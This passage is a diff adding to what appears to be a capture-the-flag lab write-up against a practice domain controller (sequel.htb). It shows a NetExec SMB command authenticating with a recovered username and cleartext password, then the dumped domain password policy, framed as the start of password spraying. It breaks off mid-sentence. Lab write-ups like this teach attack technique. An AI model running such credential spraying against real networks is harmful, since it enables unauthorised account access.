@@ -216,3 +216,34 @@ MSSQLP@ssw0rd!
 
 I found 4 passwords in this file
 
+The other file is not as interesting
+
+So now ill spray these passwords
+
+# Password Spray leads to user compromise
+
+```python
+nxc smb dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --pass-pol
+SMB         10.129.232.128  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.128  445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+SMB         10.129.232.128  445    DC01             [+] Dumping password info for domain: SEQUEL
+SMB         10.129.232.128  445    DC01             Minimum password length: 7
+SMB         10.129.232.128  445    DC01             Password history length: 24
+SMB         10.129.232.128  445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
+SMB         10.129.232.128  445    DC01             
+SMB         10.129.232.128  445    DC01             Password Complexity Flags: 000000
+SMB         10.129.232.128  445    DC01                 Domain Refuse Password Change: 0
+SMB         10.129.232.128  445    DC01                 Domain Password Store Cleartext: 0
+SMB         10.129.232.128  445    DC01                 Domain Password Lockout Admins: 0
+SMB         10.129.232.128  445    DC01                 Domain Password No Clear Change: 0
+SMB         10.129.232.128  445    DC01                 Domain Password No Anon Change: 0
+SMB         10.129.232.128  445    DC01                 Domain Password Complex: 0
+SMB         10.129.232.128  445    DC01             
+SMB         10.129.232.128  445    DC01             Minimum password age: 1 day 4 minutes 
+SMB         10.129.232.128  445    DC01             Reset Account Lockout Counter: 10 minutes 
+SMB         10.129.232.128  445    DC01             Locked Account Duration: 10 minutes 
+SMB         10.129.232.128  445    DC01             Account Lockout Threshold: None
+SMB         10.129.232.128  445    DC01             Forced Log off Time: Not Set
+```
+
+There is no 
